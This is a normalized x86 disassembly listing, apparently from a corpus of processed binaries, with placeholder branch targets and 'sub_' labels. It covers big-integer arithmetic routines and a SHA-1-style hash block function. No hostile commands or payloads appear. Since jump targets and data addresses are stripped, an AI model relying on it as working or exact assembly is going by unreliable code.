shr edx cl
add ebx 0x4
neg eax
sbb eax eax
and eax edx
dec [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
jne r-xdata
sub_10019619
push ebp
lea ebp [ esp - 0x64 ]
sub esp 0x1c4
push esi
mov esi eax
mov eax [ ebp + 0x7c ]
test eax eax
je r-xdata
and [ ebp + 0x5c ] 0x0
push [ ebp + 0x78 ]
call sub_10019aa3
pop ecx
mov [ ebp + 0x5c ] eax
jmp r-xdata
pop esi
add ebp 0x64
leave
retn
mov eax [ ebp + 0x78 ]
push edi
mov edi edx
shl edi 0x2
mov eax [ edi + eax - 0x4 ]
mov [ ebp + 0x40 ] edi
xor ecx ecx
mov edx [ ebp + 0x5c ]
test edx edx
je r-xdata
push ebx
push 0x20
pop ebx
sub ebx ecx
push edx
lea eax [ ebp - 0x160 ]
mov [ ebp + 0x44 ] ebx
call sub_10019482
mov eax [ ebp + 0x74 ]
push esi
push ebx
lea ecx [ ebp - 0x160 ]
call sub_100195c9
push [ ebp + 0x5c ]
mov [ ebp + esi * 4 - 0x160 ] eax
mov eax [ ebp + 0x78 ]
push ebx
lea ecx [ ebp - 0x54 ]
call sub_100195c9
mov eax [ ebp + edi - 0x58 ]
mov ecx [ ebp + 0x6c ]
mov [ ebp + 0x60 ] eax
push esi
mov eax ecx
call sub_10019482
mov eax [ ebp + 0x5c ]
add esp 0x18
sub esi eax
mov [ ebp + 0x38 ] esi
js r-xdata
inc ecx
shr eax 0x1
cmp ecx 0x20
jb r-xdata
mov ecx [ ebp + 0x70 ]
push [ ebp + 0x7c ]
mov eax ecx
call sub_10019482
mov eax [ ebp + 0x5c ]
and [ ebp + 0x48 ] 0x0
add esp 0x4
push 0x20
pop esi
mov [ ebp + 0x7c ] eax
cmp ebx esi
jae r-xdata
lea edx [ ebp + esi * 4 - 0x160 ]
add esi eax
lea esi [ ebp + esi * 4 - 0x160 ]
mov [ ebp + 0x3c ] ecx
lea eax [ ebp - 0x160 ]
sub [ ebp + 0x3c ] eax
mov [ ebp + 0x50 ] edx
mov [ ebp + 0x48 ] esi
test eax eax
je r-xdata
pop ebx
pop edi
lea edx [ edi + ecx ]
lea edi [ ebp - 0x160 ]
sub esi ebx
sub edi ecx
jmp r-xdata
inc [ ebp + 0x60 ]
mov ecx [ ebp + 0x60 ]
mov ebx [ esi - 0x4 ]
mov esi [ esi ]
shr ecx 0x10
mov eax 0xffff
cmp cx ax
mov [ ebp + 0x34 ] ecx
mov [ ebp + 0x58 ] esi
mov eax esi
jne r-xdata
mov edi [ esi ]
jmp r-xdata
dec [ ebp + 0x7c ]
sub edx 0x4
mov eax [ edi + edx ]
mov ecx eax
mov [ ebp + 0x40 ] ecx
mov ecx ebx
mov ebx eax
shr ebx cl
mov ecx esi
shl eax cl
or ebx [ ebp + 0x48 ]
mov [ edx ] ebx
mov ebx [ ebp + 0x44 ]
neg ebx
sbb ebx ebx
and ebx eax
cmp [ ebp + 0x7c ] 0x0
mov [ ebp + 0x48 ] ebx
jne r-xdata
movzx ecx cx
inc ecx
xor edx edx
div ecx
movzx eax ax
mov [ ebp + 0x4c ] eax
shr eax 0x10
mov [ ebp + 0x4c ] eax
jmp r-xdata
mov edx [ ebp + 0x50 ]
mov ecx [ ebp + 0x5c ]
push edi
push edx
lea eax [ ebp - 0x54 ]
call sub_10019ab7
mov ebx [ ebp + 0x44 ]
shr ecx 0x10
add ecx [ ebp + 0x30 ]
sub [ ebp + 0x58 ] ecx
dec [ ebp + 0x58 ]
movzx edi [ ebp + 0x60 ]
movzx esi [ ebp + 0x34 ]
movzx eax ax
mov ecx edi
imul ecx eax
imul eax esi
mov [ ebp + 0x30 ] eax
mov eax ecx
shl eax 0x10
or edx 0xffffffff
sub ebx eax
sub edx eax
cmp ebx edx
jbe r-xdata
push [ ebp + 0x5c ]
mov eax [ ebp + 0x50 ]
push eax
lea edx [ ebp - 0x54 ]
inc edi
call sub_10019496
jmp r-xdata
push [ ebp + 0x50 ]
mov ecx [ ebp + 0x5c ]
lea edx [ ebp - 0x54 ]
call sub_10019a5a
pop ecx
test eax eax
jl r-xdata
mov eax edi
shl eax 0x10
or ecx 0xffffffff
sub ebx eax
sub ecx eax
cmp ebx ecx
jbe r-xdata
jne r-xdata
sub [ esi ] eax
cmp [ esi ] 0x0
pop ecx
pop ecx
jne r-xdata
mov ecx [ ebp + 0x50 ]
dec [ ebp + 0x38 ]
mov eax [ ebp + 0x3c ]
sub [ ebp + 0x50 ] 0x4
sub esi 0x4
cmp [ ebp + 0x38 ] 0x0
mov [ eax + ecx ] edi
mov [ ebp + 0x48 ] esi
jge r-xdata
sub [ ebp + 0x58 ] esi
inc [ ebp + 0x4c ]
jmp r-xdata
dec [ ebp + 0x58 ]
mov eax 0xffff
cmp [ ebp + 0x34 ] ax
jne r-xdata
mov eax edi
shl eax 0x10
cmp ebx eax
jb r-xdata
cmp [ ebp + 0x60 ] 0xffffffff
jne r-xdata
mov edi [ ebp + 0x40 ]
cmp [ ebp + 0x58 ] esi
ja r-xdata
mov ecx [ ebp + 0x58 ]
mov eax ebx
shl ecx 0x10
shr eax 0x10
add eax ecx
xor edx edx
lea ecx [ esi + 0x1 ]
div ecx
movzx edx ax
movzx edx [ ebp + 0x58 ]
jmp r-xdata
mov ecx eax
shl ecx 0x10
or esi 0xffffffff
sub ebx ecx
sub esi ecx
cmp ebx esi
jbe r-xdata
dec [ ebp + 0x58 ]
movzx eax dx
imul edi eax
imul eax esi
or ecx 0xffffffff
sub ebx edi
sub ecx edi
cmp ebx ecx
jbe r-xdata
mov ecx [ ebp + 0x58 ]
shr eax 0x10
sub ecx eax
dec [ ebp + 0x58 ]
sub ebx [ ebp + 0x60 ]
or eax 0xffffffff
sub eax [ ebp + 0x60 ]
cmp ebx eax
jbe r-xdata
jne r-xdata
inc edx
jmp r-xdata
dec ecx
movzx edi [ ebp + 0x4c ]
mov esi [ ebp + 0x48 ]
mov ebx [ ebp + 0x44 ]
movzx eax dx
shl edi 0x10
add edi eax
dec [ ebp + 0x60 ]
cmp ebx [ ebp + 0x60 ]
jb r-xdata
test ecx ecx
ja r-xdata
sub_100198df
push ebp
mov ebp esp
sub esp 0x108
push [ ebp + 0x18 ]
lea eax [ ebp - 0x108 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x10 ]
call sub_10019619
add esp 0x14
leave
retn
sub_10019908
push ebp
mov ebp esp
sub esp 0x108
push [ ebp + 0x10 ]
lea eax [ ebp - 0x108 ]
push eax
mov eax [ ebp + 0xc ]
mov edx esi
call sub_100194da
push esi
push [ ebp + 0x14 ]
lea eax [ esi + esi ]
push eax
lea eax [ ebp - 0x108 ]
push eax
push [ ebp + 0x8 ]
call sub_100198df
add esp 0x1c
leave
retn
sub_10019941
push ebp
lea ebp [ esp - 0x68 ]
sub esp 0x218
push esi
mov esi eax
push edi
mov edi ecx
mov ecx [ ebp + 0x74 ]
push esi
lea eax [ ebp - 0x1b0 ]
call sub_10019a8b
push [ ebp + 0x7c ]
lea eax [ ebp - 0x1b0 ]
push [ ebp + 0x74 ]
push eax
lea eax [ ebp - 0x12c ]
push eax
call sub_10019908
push [ ebp + 0x7c ]
lea eax [ ebp - 0x12c ]
push [ ebp + 0x74 ]
push eax
lea eax [ ebp - 0xa8 ]
push eax
call sub_10019908
push esi
lea eax [ ebp - 0x24 ]
call sub_10019482
add esp 0x28
mov [ ebp - 0x24 ] 0x1
test edi edi
je r-xdata
dec edi
mov [ ebp + 0x60 ] edi
mov [ ebp + 0x64 ] edi
test edi edi
jl r-xdata
push [ ebp + 0x78 ]
mov eax edi
call sub_10019aa3
pop ecx
mov edi eax
mov eax [ ebp + 0x70 ]
push esi
lea ecx [ ebp - 0x24 ]
call sub_10019a8b
pop ecx
pop edi
pop esi
add ebp 0x68
leave
retn
push ebx
lea ebx [ ecx - 0x1 ]
shr ebx 0x1
inc ebx
mov eax 0xc0000000
test eax edi
jne r-xdata
shl edi 0x2
dec ebx
jne r-xdata
push [ ebp + 0x7c ]
imul eax eax 0x84
lea eax [ ebp + eax - 0x234 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
push eax
call sub_10019908
add esp 0x10
shl edi 0x2
dec ecx
dec ecx
test eax edi
je r-xdata
push [ ebp + 0x7c ]
lea eax [ ebp - 0x24 ]
push eax
push eax
push eax
call sub_10019908
push [ ebp + 0x7c ]
lea eax [ ebp - 0x24 ]
push eax
push eax
push eax
call sub_10019908
mov eax edi
shr eax 0x1e
add esp 0x20
test eax eax
je r-xdata
dec [ ebp + 0x64 ]
jns r-xdata
test ecx ecx
jbe r-xdata
mov ecx [ ebp + 0x78 ]
mov eax [ ebp + 0x64 ]
mov edi [ ecx + eax * 4 ]
push 0x20
pop ecx
cmp eax [ ebp + 0x60 ]
jne r-xdata
pop ebx
sub_10019a5a
push esi
push edi
test ecx ecx
je r-xdata
xor eax eax
mov edi [ esp + 0xc ]
lea eax [ edx + ecx * 4 ]
sub edi edx
xor eax eax
inc eax
jmp r-xdata
jb r-xdata
pop edi
pop esi
retn
or eax 0xffffffff
jmp r-xdata
test ecx ecx
jne r-xdata
sub eax 0x4
mov edx [ edi + eax ]
mov esi [ eax ]
dec ecx
cmp edx esi
ja r-xdata
sub_10019ab7
push ebp
mov ebp esp
sub esp 0x14
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
cmp [ ebp + 0xc ] ebx
je r-xdata
pop esi
mov eax ebx
pop ebx
leave
retn
cmp ecx ebx
jbe r-xdata
sub eax edx
mov [ ebp - 0x4 ] edx
sub [ ebp - 0x4 ] esi
push edi
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ ecx + esi ]
lea ecx [ ebp - 0x10 ]
push ecx
lea ecx [ ebp - 0x14 ]
push ecx
push [ edi + eax ]
push [ ebp + 0xc ]
call sub_10019b31
mov edi [ edi ]
or eax 0xffffffff
sub edi ebx
sub eax ebx
add esp 0x10
cmp eax edi
mov eax [ ebp - 0x10 ]
sbb ebx ebx
mov [ esi ] edi
sub [ esi ] eax
mov ecx [ esi ]
or edx 0xffffffff
sub edx eax
neg ebx
cmp ecx edx
jbe r-xdata
add ebx [ ebp - 0x14 ]
add esi 0x4
dec [ ebp - 0x8 ]
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
pop edi
sub_10019b31
push ebp
mov ebp esp
push ecx
movzx edx [ ebp + 0x8 ]
movzx eax [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
shr esi 0x10
shr edi 0x10
movzx esi si
movzx edi di
mov ecx edx
imul edx edi
imul ecx eax
mov [ ebp + 0xc ] esi
imul esi edi
imul eax [ ebp + 0xc ]
mov [ ebx ] ecx
mov ebx [ ebp + 0x10 ]
add eax edx
mov [ ebx ] esi
cmp eax edx
jae r-xdata
mov edi [ ebp + 0x14 ]
mov edx eax
shl edx 0x10
add ecx edx
shr eax 0x10
mov [ edi ] ecx
cmp ecx edx
jae r-xdata
mov [ ebp - 0x4 ] 0x10000
add esi eax
add esi [ ebp - 0x4 ]
pop edi
mov [ ebx ] esi
pop esi
pop ebx
leave
retn
inc [ ebp - 0x4 ]
sub_10019ba1
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push ebx
push esi
mov esi eax
mov eax [ esi + 0x14 ]
lea ecx [ eax + edx * 8 ]
push edi
cmp ecx eax
jae r-xdata
mov [ esi + 0x14 ] ecx
mov ecx edx
shr ecx 0x1d
add [ esi + 0x18 ] ecx
shr eax 0x3
and eax 0x3f
je r-xdata
inc [ esi + 0x18 ]
cmp [ ebp + 0xc ] 0x40
jl r-xdata
push 0x40
pop edi
sub edi eax
cmp edx edi
lea ecx [ eax + esi + 0x1c ]
mov eax [ ebp + 0x8 ]
jge r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
add esi 0x1c
test ecx ecx
je r-xdata
mov ebx [ ebp + 0xc ]
shr ebx 0x6
mov eax ebx
imul eax eax 0xffffffc0
lea edi [ esi + 0x1c ]
sub edi [ ebp + 0x8 ]
add [ ebp + 0xc ] eax
mov edx edi
test edi edi
je r-xdata
mov esi edx
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub esi eax
mov dl [ eax ]
mov [ edi + eax ] dl
inc eax
dec ecx
jne r-xdata
lea eax [ esi + 0x1c ]
push 0x40
push eax
call sub_10019d4a
pop ecx
pop ecx
mov eax esi
call sub_10019d88
add [ ebp + 0x8 ] 0x40
sub edi 0x40
dec ebx
jne r-xdata
lea eax [ esi + 0x1c ]
push 0x40
push eax
call sub_10019d4a
pop ecx
pop ecx
mov eax esi
call sub_10019d88
add [ ebp + 0x8 ] edi
sub [ ebp + 0xc ] edi
sub ecx eax
sub ecx eax
mov dl [ eax ]
mov [ esi + eax ] dl
inc eax
dec ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
push 0x40
pop ecx
mov bl [ eax ]
mov [ ecx + eax ] bl
inc eax
dec edx
jne r-xdata
mov dl [ eax ]
mov [ ecx + eax ] dl
inc eax
dec esi
jne r-xdata
jmp r-xdata
sub_10019c85
push ebp
mov ebp esp
push ecx
mov eax [ esi + 0x18 ]
push ebx
mov [ ebp - 0x4 ] eax
push edi
mov edi [ esi + 0x14 ]
mov eax edi
shr eax 0x3
and eax 0x3f
mov [ eax + esi + 0x1c ] 0x80
inc eax
cmp eax 0x38
jle r-xdata
push 0x38
pop ecx
sub ecx eax
push ecx
lea eax [ eax + esi + 0x1c ]
call sub_100193b8
add esp 0x4
push 0x40
pop ecx
sub ecx eax
push ecx
lea eax [ eax + esi + 0x1c ]
call sub_100193b8
lea ebx [ esi + 0x1c ]
push 0x40
push ebx
call sub_10019d4a
mov eax esi
call sub_10019d88
push 0x38
push 0x0
push ebx
call sub_10024b80
add esp 0x18
jmp r-xdata
mov dl [ eax - 0x2 ]
mov [ ecx + 0x1 ] dl
mov dl [ eax - 0x1 ]
mov [ ecx ] dl
mov dl [ eax ]
mov [ ecx - 0x1 ] dl
mov dl [ eax + 0x1 ]
mov [ ecx - 0x2 ] dl
add eax 0x4
add ecx 0x4
dec edi
jne r-xdata
push 0x5c
push edi
push esi
call sub_10024b80
add esp 0xc
pop edi
pop ebx
leave
retn
lea ebx [ esi + 0x1c ]
push 0x40
push ebx
call sub_10019d4a
mov eax [ ebp - 0x4 ]
mov [ esi + 0x54 ] eax
mov eax esi
mov [ esi + 0x58 ] edi
call sub_10019d88
push 0x14
push ebx
call sub_10019d4a
mov ecx [ ebp + 0x8 ]
add esp 0x10
push 0x5
add ecx 0x2
lea eax [ esi + 0x2 ]
pop edi
sub_10019d4a
shr [ esp + 0x8 ] 0x2
xor edx edx
cmp [ esp + 0x8 ] edx
jle r-xdata
retn
push esi
push edi
mov eax [ esp + 0xc ]
lea ecx [ eax + edx * 4 ]
mov eax [ ecx ]
rol eax 0x10
mov esi eax
shr esi 0x8
mov edi eax
shl edi 0x8
xor esi edi
and esi 0xff00ff
shl eax 0x8
xor esi eax
inc edx
cmp edx [ esp + 0x10 ]
mov [ ecx ] esi
jl r-xdata
pop edi
pop esi
sub_10019d88
sub esp 0x148
push ebx
push ebp
push esi
push edi
push 0x10
lea esi [ eax + 0x1c ]
pop ecx
lea edi [ esp + 0x10 ]
[ edi ] [ esi ]
mov edx [ esp + 0x14 ]
xor edx [ esp + 0x1c ]
mov ebx [ esp + 0x28 ]
xor ebx [ esp + 0x40 ]
xor edx [ esp + 0x34 ]
xor ebx [ esp + 0x20 ]
xor edx [ esp + 0x48 ]
mov esi [ esp + 0x20 ]
xor ebx edx
mov [ esp + 0x60 ] ebx
xor esi [ esp + 0x38 ]
mov ecx [ esp + 0x10 ]
xor esi [ esp + 0x4c ]
xor ecx [ esp + 0x18 ]
xor esi [ esp + 0x18 ]
mov ebx [ esp + 0x2c ]
xor ebx [ esp + 0x24 ]
mov edi [ esp + 0x24 ]
xor ebx esi
xor ebx [ esp + 0x44 ]
xor edi [ esp + 0x3c ]
xor ecx [ esp + 0x30 ]
xor edi [ esp + 0x1c ]
xor ecx [ esp + 0x44 ]
mov [ esp + 0x64 ] ebx
mov ebx [ esp + 0x28 ]
xor edi ecx
xor ebx edi
xor ebx [ esp + 0x48 ]
mov [ esp + 0x58 ] esi
xor ebx [ esp + 0x30 ]
mov [ esp + 0x5c ] edi
mov [ esp + 0x68 ] ebx
mov ebx [ esp + 0x2c ]
xor ebx [ esp + 0x60 ]
xor ebx [ esp + 0x4c ]
xor ebx [ esp + 0x34 ]
mov [ esp + 0x6c ] ebx
mov ebx [ esp + 0x64 ]
xor ebx [ esp + 0x38 ]
xor ebx ecx
xor ebx [ esp + 0x30 ]
mov [ esp + 0x70 ] ebx
mov ebx [ esp + 0x68 ]
xor ebx [ esp + 0x3c ]
xor ebx edx
xor ebx [ esp + 0x34 ]
mov [ esp + 0x74 ] ebx
mov ebx [ esp + 0x6c ]
xor ebx [ esp + 0x40 ]
xor ebx esi
xor ebx [ esp + 0x38 ]
mov [ esp + 0x78 ] ebx
mov ebx [ esp + 0x70 ]
xor ebx edi
xor ebx [ esp + 0x3c ]
xor ebx [ esp + 0x44 ]
mov [ esp + 0x7c ] ebx
mov ebx [ esp + 0x74 ]
xor ebx [ esp + 0x60 ]
xor ebx [ esp + 0x40 ]
xor ebx [ esp + 0x48 ]
mov [ esp + 0x80 ] ebx
mov ebx [ esp + 0x78 ]
xor ebx [ esp + 0x64 ]
xor ebx [ esp + 0x4c ]
xor ebx [ esp + 0x44 ]
mov [ esp + 0x84 ] ebx
mov ebx [ esp + 0x7c ]
xor ebx [ esp + 0x68 ]
xor ebx [ esp + 0x48 ]
xor ebx ecx
mov [ esp + 0x88 ] ebx
mov ebx [ esp + 0x80 ]
xor ebx [ esp + 0x6c ]
xor ebx [ esp + 0x4c ]
xor ebx edx
mov [ esp + 0x8c ] ebx
mov ebx [ esp + 0x84 ]
xor ebx [ esp + 0x70 ]
xor ebx esi
xor ebx ecx
mov [ esp + 0x90 ] ebx
mov ebx [ esp + 0x88 ]
xor ebx [ esp + 0x74 ]
xor ebx edi
xor ebx edx
mov [ esp + 0x94 ] ebx
mov ebx [ esp + 0x8c ]
xor ebx [ esp + 0x78 ]
xor ebx [ esp + 0x60 ]
xor ebx esi
mov esi [ esp + 0x90 ]
xor esi [ esp + 0x7c ]
mov [ esp + 0x98 ] ebx
xor esi [ esp + 0x64 ]
xor esi edi
mov edi [ esp + 0x94 ]
xor edi [ esp + 0x80 ]
mov [ esp + 0x9c ] esi
xor edi [ esp + 0x68 ]
xor edi [ esp + 0x60 ]
mov [ esp + 0xa0 ] edi
mov edi ebx
xor edi [ esp + 0x84 ]
xor edi [ esp + 0x6c ]
xor edi [ esp + 0x64 ]
mov [ esp + 0xa4 ] edi
mov edi esi
xor edi [ esp + 0x88 ]
xor edi [ esp + 0x70 ]
xor edi [ esp + 0x68 ]
mov [ esp + 0xa8 ] edi
mov edi [ esp + 0xa0 ]
xor edi [ esp + 0x8c ]
xor edi [ esp + 0x74 ]
xor edi [ esp + 0x6c ]
mov [ esp + 0xac ] edi
mov edi [ esp + 0xa4 ]
xor edi [ esp + 0x90 ]
xor edi [ esp + 0x78 ]
xor edi [ esp + 0x70 ]
mov [ esp + 0xb0 ] edi
mov edi [ esp + 0xa8 ]
xor edi [ esp + 0x94 ]
xor edi [ esp + 0x7c ]
xor edi [ esp + 0x74 ]
mov [ esp + 0xb4 ] edi
mov edi [ esp + 0xac ]
xor edi ebx
xor edi [ esp + 0x80 ]
xor edi [ esp + 0x78 ]
mov [ esp + 0xb8 ] edi
mov edi [ esp + 0xb0 ]
xor edi esi
xor edi [ esp + 0x84 ]
xor edi [ esp + 0x7c ]
mov [ esp + 0xbc ] edi
mov edi [ esp + 0xb4 ]
xor edi [ esp + 0xa0 ]
xor edi [ esp + 0x88 ]
xor edi [ esp + 0x80 ]
mov [ esp + 0xc0 ] edi
mov edi [ esp + 0xb8 ]
xor edi [ esp + 0xa4 ]
xor edi [ esp + 0x8c ]
xor edi [ esp + 0x84 ]
mov [ esp + 0xc4 ] edi
mov edi [ esp + 0xbc ]
xor edi [ esp + 0xa8 ]
xor edi [ esp + 0x90 ]
xor edi [ esp + 0x88 ]
mov [ esp + 0xc8 ] edi
mov edi [ esp + 0xc0 ]
xor edi [ esp + 0xac ]
xor edi [ esp + 0x94 ]
xor edi [ esp + 0x8c ]
mov [ esp + 0xcc ] edi
mov edi [ esp + 0xc4 ]
xor edi [ esp + 0xb0 ]
xor edi ebx
xor edi [ esp + 0x90 ]
mov [ esp + 0xd0 ] edi
mov edi [ esp + 0xc8 ]
xor edi [ esp + 0xb4 ]
xor edi esi
xor edi [ esp + 0x94 ]
mov [ esp + 0xd4 ] edi
mov edi [ esp + 0xcc ]
xor edi [ esp + 0xb8 ]
xor edi [ esp + 0xa0 ]
xor edi ebx
mov ebx [ esp + 0xd0 ]
xor ebx [ esp + 0xbc ]
mov [ esp + 0xd8 ] edi
xor ebx [ esp + 0xa4 ]
xor ebx esi
mov esi [ esp + 0xd4 ]
xor esi [ esp + 0xc0 ]
mov [ esp + 0xdc ] ebx
xor esi [ esp + 0xa8 ]
xor esi [ esp + 0xa0 ]
mov [ esp + 0xe0 ] esi
mov esi edi
xor esi [ esp + 0xc4 ]
xor esi [ esp + 0xac ]
xor esi [ esp + 0xa4 ]
mov [ esp + 0xe4 ] esi
mov esi ebx
xor esi [ esp + 0xc8 ]
xor esi [ esp + 0xb0 ]
xor esi [ esp + 0xa8 ]
mov [ esp + 0xe8 ] esi
mov esi [ esp + 0xe0 ]
xor esi [ esp + 0xcc ]
xor esi [ esp + 0xb4 ]
xor esi [ esp + 0xac ]
mov [ esp + 0xec ] esi
mov esi [ esp + 0xe4 ]
xor esi [ esp + 0xd0 ]
xor esi [ esp + 0xb8 ]
xor esi [ esp + 0xb0 ]
mov [ esp + 0xf0 ] esi
mov esi [ esp + 0xe8 ]
xor esi [ esp + 0xd4 ]
xor esi [ esp + 0xbc ]
xor esi [ esp + 0xb4 ]
mov [ esp + 0xf4 ] esi
mov esi [ esp + 0xec ]
xor esi edi
xor esi [ esp + 0xc0 ]
xor esi [ esp + 0xb8 ]
mov [ esp + 0xf8 ] esi
mov esi [ esp + 0xf0 ]
xor esi ebx
xor esi [ esp + 0xc4 ]
xor esi [ esp + 0xbc ]
mov [ esp + 0xfc ] esi
mov esi [ esp + 0xf4 ]
xor esi [ esp + 0xe0 ]
xor esi [ esp + 0xc8 ]
xor esi [ esp + 0xc0 ]
mov [ esp + 0x100 ] esi
mov esi [ esp + 0xf8 ]
xor esi [ esp + 0xe4 ]
xor esi [ esp + 0xcc ]
xor esi [ esp + 0xc4 ]
mov [ esp + 0x104 ] esi
mov esi [ esp + 0xfc ]
xor esi [ esp + 0xe8 ]
xor esi [ esp + 0xd0 ]
xor esi [ esp + 0xc8 ]
mov [ esp + 0x108 ] esi
mov esi [ esp + 0x100 ]
xor esi [ esp + 0xec ]
xor esi [ esp + 0xd4 ]
xor esi [ esp + 0xcc ]
mov [ esp + 0x10c ] esi
mov esi [ esp + 0x104 ]
xor esi [ esp + 0xf0 ]
xor esi edi
xor esi [ esp + 0xd0 ]
mov [ esp + 0x110 ] esi
mov esi [ esp + 0x108 ]
xor esi [ esp + 0xf4 ]
xor esi ebx
xor esi [ esp + 0xd4 ]
mov [ esp + 0x114 ] esi
mov esi [ esp + 0x10c ]
xor esi [ esp + 0xf8 ]
xor esi [ esp + 0xe0 ]
xor esi edi
mov edi [ esp + 0x110 ]
xor edi [ esp + 0xfc ]
mov [ esp + 0x118 ] esi
xor edi [ esp + 0xe4 ]
xor edi ebx
mov ebx [ esp + 0x114 ]
xor ebx [ esp + 0x100 ]
mov [ esp + 0x11c ] edi
xor ebx [ esp + 0xe8 ]
xor ebx [ esp + 0xe0 ]
mov [ esp + 0x120 ] ebx
mov ebx esi
xor ebx [ esp + 0x104 ]
xor ebx [ esp + 0xec ]
xor ebx [ esp + 0xe4 ]
mov [ esp + 0x124 ] ebx
mov ebx edi
xor ebx [ esp + 0x108 ]
xor ebx [ esp + 0xf0 ]
xor ebx [ esp + 0xe8 ]
mov [ esp + 0x128 ] ebx
mov ebx [ esp + 0x120 ]
xor ebx [ esp + 0x10c ]
xor ebx [ esp + 0xf4 ]
xor ebx [ esp + 0xec ]
mov [ esp + 0x12c ] ebx
mov ebx [ esp + 0x124 ]
xor ebx [ esp + 0x110 ]
mov ebp [ esp + 0x12c ]
xor ebx [ esp + 0xf8 ]
xor ebp esi
xor ebx [ esp + 0xf0 ]
xor ebp [ esp + 0x100 ]
mov [ esp + 0x130 ] ebx
mov ebx [ esp + 0x128 ]
xor ebx [ esp + 0x114 ]
mov esi [ esp + 0x130 ]
xor ebx [ esp + 0xfc ]
xor ebp [ esp + 0xf8 ]
xor ebx [ esp + 0xf4 ]
xor esi edi
xor esi [ esp + 0x104 ]
mov [ esp + 0x134 ] ebx
xor ebx [ esp + 0x120 ]
xor esi [ esp + 0xfc ]
xor ebx [ esp + 0x108 ]
mov [ esp + 0x13c ] esi
xor ebx [ esp + 0x100 ]
xor esi [ esp + 0x128 ]
mov [ esp + 0x138 ] ebp
xor ebp [ esp + 0x124 ]
xor esi [ esp + 0x110 ]
xor ebp [ esp + 0x10c ]
xor esi [ esp + 0x108 ]
xor ebp [ esp + 0x104 ]
mov [ esp + 0x140 ] ebx
xor ebx [ esp + 0x12c ]
mov [ esp + 0x148 ] esi
xor ebx [ esp + 0x114 ]
mov esi [ eax ]
xor ebx [ esp + 0x10c ]
mov [ esp + 0x144 ] ebp
mov [ esp + 0x14c ] ebx
mov ebx [ eax + 0x4 ]
mov edi [ eax + 0xc ]
rol esi 0x5
add esi [ eax + 0x10 ]
mov ebp ebx
not ebp
and ebp edi
mov edi [ eax + 0x8 ]
and edi ebx
or ebp edi
add ebp esi
mov esi [ esp + 0x10 ]
lea edi [ esi + ebp + 0x5a827999 ]
mov esi [ eax + 0xc ]
mov ebp [ eax + 0x8 ]
mov [ rw-data ] edi
ror ebx 0x2
rol edi 0x5
mov [ esp + 0x154 ] edi
mov [ rw-data ] esi
mov esi [ eax ]
mov edi esi
not edi
and edi ebp
mov ebp ebx
and ebp esi
or edi ebp
mov ebp edi
mov edi [ esp + 0x154 ]
add edi [ rw-data ]
add ebp edi
mov edi [ esp + 0x14 ]
lea ebp [ edi + ebp + 0x5a827999 ]
mov edi [ eax + 0x8 ]
ror esi 0x2
mov [ rw-data ] edi
mov edi [ rw-data ]
mov [ rw-data ] esi
mov esi edi
mov [ rw-data ] ebx
not esi
and esi ebx
mov ebx [ rw-data ]
and ebx edi
or esi ebx
mov ebx [ esp + 0x18 ]
mov [ rw-data ] ebp
rol ebp 0x5
add ebp [ rw-data ]
add esi ebp
mov ebp [ rw-data ]
lea ebx [ esi + ebx + 0x5a827999 ]
mov esi [ rw-data ]
ror edi 0x2
mov [ rw-data ] edi
mov [ rw-data ] esi
mov esi [ rw-data ]
mov edi esi
not edi
and edi ebp
mov [ rw-data ] ebx
mov [ rw-data ] ebp
mov ebp [ rw-data ]
rol ebx 0x5
add ebx [ rw-data ]
and ebp esi
or edi ebp
mov ebp [ rw-data ]
add edi ebx
mov ebx [ esp + 0x1c ]
lea ebx [ edi + ebx + 0x5a827999 ]
mov edi [ rw-data ]
ror esi 0x2
mov [ rw-data ] edi
mov edi [ rw-data ]
mov [ rw-data ] esi
mov [ rw-data ] ebx
mov [ rw-data ] ebp
rol ebx 0x5
mov esi edi
add ebx [ rw-data ]
not esi
and esi ebp
mov ebp [ rw-data ]
and ebp edi
or esi ebp
add esi ebx
mov ebx [ esp + 0x20 ]
mov ebp [ rw-data ]
lea ebx [ esi + ebx + 0x5a827999 ]
mov esi [ rw-data ]
ror edi 0x2
mov [ rw-data ] esi
mov esi [ rw-data ]
mov [ rw-data ] edi
mov edi esi
not edi
and edi ebp
mov [ rw-data ] ebx
rol ebx 0x5
add ebx [ rw-data ]
mov [ rw-data ] ebp
mov ebp [ rw-data ]
and ebp esi
or edi ebp
mov ebp [ rw-data ]
add edi ebx
mov ebx [ esp + 0x24 ]
lea ebx [ edi + ebx + 0x5a827999 ]
mov edi [ rw-data ]
ror esi 0x2
mov [ rw-data ] esi
mov [ rw-data ] edi
mov edi [ rw-data ]
mov esi edi
not esi
and esi ebp
mov [ rw-data ] ebp
mov ebp [ rw-data ]
and ebp edi
or esi ebp
mov ebp [ rw-data ]
mov [ rw-data ] ebx
rol ebx 0x5
add ebx [ rw-data ]
add esi ebx
mov ebx [ esp + 0x28 ]
lea ebx [ esi + ebx + 0x5a827999 ]
mov esi [ rw-data ]
ror edi 0x2
mov [ rw-data ] esi
mov esi [ rw-data ]
mov [ rw-data ] edi
mov edi esi
mov [ rw-data ] ebp
not edi
and edi ebp
mov ebp [ rw-data ]
and ebp esi
mov [ rw-data ] ebx
rol ebx 0x5
add ebx [ rw-data ]
or edi ebp
mov ebp [ rw-data ]
add edi ebx
mov ebx [ esp + 0x2c ]
lea ebx [ edi + ebx + 0x5a827999 ]
mov edi [ rw-data ]
ror esi 0x2
mov [ rw-data ] esi
mov [ rw-data ] edi
mov edi [ rw-data ]
mov esi edi
not esi
and esi ebp
mov [ rw-data ] ebp
mov ebp [ rw-data ]
mov [ rw-data ] ebx
and ebp edi
rol ebx 0x5
or esi ebp
add ebx [ rw-data ]
mov ebp [ rw-data ]
add esi ebx
mov ebx [ esp + 0x30 ]
